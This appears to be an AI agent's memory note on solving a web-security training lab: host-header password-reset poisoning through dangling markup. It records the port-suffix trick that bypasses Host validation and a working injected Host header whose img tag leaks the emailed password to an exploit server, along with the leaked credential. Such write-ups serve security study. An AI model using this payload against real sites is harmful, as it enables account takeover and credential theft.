---
metadata:
  node_type: memory
name: "lab-host-header-password-reset-poisoning-via-dangling-markup"
description: "arm A: dangling-markup host-header reset poisoning solved - port-suffix trick defeats Host validation; lab email scanner renders injected img and leaks the new password"
last_updated: 2026-10-11T00:58:18+08:00
created: 2026-10-11T00:58:18+08:00
---

## 2026-10-10 arm A - solved (port-suffix dangling markup)

Target: /web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup
Instance: 0a06007f03a8eed18012173000e2000f; exploit server exploit-0ab400a3037dee7180f2162401250050.

Email template (raw, single-quoted href, no double quote anywhere):
`<p>Hello!</p><p>Please <a href='https://HOST/login'>click here</a> to login with your new password: PW</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>`

Key facts learned:
- The reset flow emails a NEW PLAINTEXT PASSWORD, not a token.
- The Academy front-end validates Host by splitting on the first `:`. Any Host whose hostname part equals the lab domain passes even when the "port" is garbage.
  - `Host: example.com` -> 403; `Host: <lab>'...` -> 403; `Host: <lab>.` / `evil.<lab>` / `<lab>x` -> 421 Invalid host.
  - `Host: <lab>:1337` -> 200; `Host: <lab>:'><img src="https://EXPLOIT/?` -> 200 (payload rides in the port slot).
- X-Forwarded-Host was NOT reflected; the app uses Host.

Working injection (post the reset for the victim with this Host):
`Host: <lab>:'><img src="https://exploit-...exploit-server.net/?`
Email becomes `href='https://<lab>:'><img src="https://exploit.../?/login'>click here</a> to login with your new password: PW...`
No `"` exists after the injection, so the src attribute runs to EOF and swallows the password.
The LAB'S OWN EMAIL SCANNER (10.0.3.238, UA none) auto-renders the mail and fetches the img - no victim click needed. Password read off exploit server GET /log.
carlos pw leaked as `81oVlLAhY3`; POST /login carlos -> 302 /my-account?id=carlos -> banner "Congratulations, you solved the lab!".

Tooling notes:
- raw_http sends --body only when an explicit Content-Length header is supplied; otherwise the app answers 400 "Missing parameter 'csrf'".
- raw_matrix spec: {host,port,tls,variants:[{name,line,headers,body}]}; --values does template x value sweeps ({{V}} in line/headers/body/name).
- http_dump/raw_http need a manually supplied Cookie; http_session alone cannot override Host.

